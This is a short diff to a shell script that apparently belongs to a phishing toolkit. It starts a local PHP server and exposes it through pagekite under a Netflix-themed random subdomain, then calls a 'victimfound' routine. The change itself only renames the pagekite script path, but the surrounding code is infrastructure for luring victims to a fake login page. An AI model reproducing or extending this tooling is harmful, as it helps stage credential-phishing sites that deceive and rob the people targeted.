@@ -236,11 +236,11 @@ cd .www/ && php -S localhost:$pagekite_port > /dev/null 2>&1 &
 
 if [[ $pagekite_subdomain_resp == true ]]; then
 sleep 1
-python2 .www/.pagekite.sh --clean --signup $pagekite_port $pagekite_subdomain.pagekite.me
+python2 .www/.pagekite --clean --signup $pagekite_port $pagekite_subdomain.pagekite.me
 victimfound
 else
 sleep 1
-python2 .www/.pagekite.sh --clean --signup $pagekite_port netflix$RANDOM.pagekite.me
+python2 .www/.pagekite --clean --signup $pagekite_port netflix$RANDOM.pagekite.me
 victimfound
 fi
 }
